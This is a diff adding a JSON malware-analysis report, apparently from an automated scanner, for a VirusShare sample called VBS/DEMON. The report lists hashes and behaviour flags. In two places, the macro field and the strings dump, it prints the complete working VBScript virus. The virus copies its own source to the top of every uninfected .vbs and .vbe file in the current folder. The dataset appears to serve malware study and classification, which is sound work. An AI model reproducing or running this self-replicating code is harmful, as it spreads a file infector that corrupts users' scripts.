@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "WINDOWS": "May enumerate application windows"
+        },
+        "macro": "'VBS/DEMON\n'Created by X with SIMPLE WINDOWS SCRIPTING HOST VIRUS CREATOR v1.0\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1)\nSelf = OpenSelf.ReadAll\nSet CurrentDirectory = FSO.GetFolder(\".\").Files\nFor Each ScriptFiles in CurrentDirectory\n   ExtName = FSO.GetExtensionName(ScriptFiles.path)\n\tIf ExtName = \"vbs\" or ExtName = \"vbe\" then\n\t   Set Scripts = FSO.OpenTextFile(ScriptFiles.path, 1)\n\t\tIf Scripts.ReadLine <> \"'VBS/DEMON\" then\n\t\t   Set Scripts = Nothing\n\t\t   Set Scripts = FSO.OpenTextFile(ScriptFiles.path, 1)\n\t\t   ScriptsSource = Scripts.ReadAll\n\t\t   Set WriteToScripts = FSO.OpenTextFile(ScriptFiles.path, 2)\n\t\t   WriteToScripts.WriteLine Self\n\t\t   WriteToScripts.WriteLine ScriptsSource\n\t           WriteToScripts.Close\n               End If\n\tEnd If\nNext"
+    },
+    "filename": "VirusShare_0874bd1e0a3ddb412aced13ad9d72838",
+    "filesize": 852,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0874bd1e0a3ddb412aced13ad9d72838",
+        "sha1": "55555dfc73aeabdaab07b4733aa0d5f0743cf91d",
+        "sha256": "66a4d9c72f9496e179bc502342e0501516dc9e0380af74857a57698e29ed0c5d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'VBS/DEMON",
+            "'Created by X with SIMPLE WINDOWS SCRIPTING HOST VIRUS CREATOR v1.0",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1)",
+            "Self = OpenSelf.ReadAll",
+            "Set CurrentDirectory = FSO.GetFolder(\".\").Files",
+            "For Each ScriptFiles in CurrentDirectory",
+            "   ExtName = FSO.GetExtensionName(ScriptFiles.path)",
+            "\tIf ExtName = \"vbs\" or ExtName = \"vbe\" then",
+            "\t   Set Scripts = FSO.OpenTextFile(ScriptFiles.path, 1)",
+            "\t\tIf Scripts.ReadLine <> \"'VBS/DEMON\" then",
+            "\t\t   Set Scripts = Nothing",
+            "\t\t   Set Scripts = FSO.OpenTextFile(ScriptFiles.path, 1)",
+            "\t\t   ScriptsSource = Scripts.ReadAll",
+            "\t\t   Set WriteToScripts = FSO.OpenTextFile(ScriptFiles.path, 2)",
+            "\t\t   WriteToScripts.WriteLine Self",
+            "\t\t   WriteToScripts.WriteLine ScriptsSource",
+            "\t           WriteToScripts.Close",
+            "               End If",
+            "\tEnd If",
+            "Next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272396",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
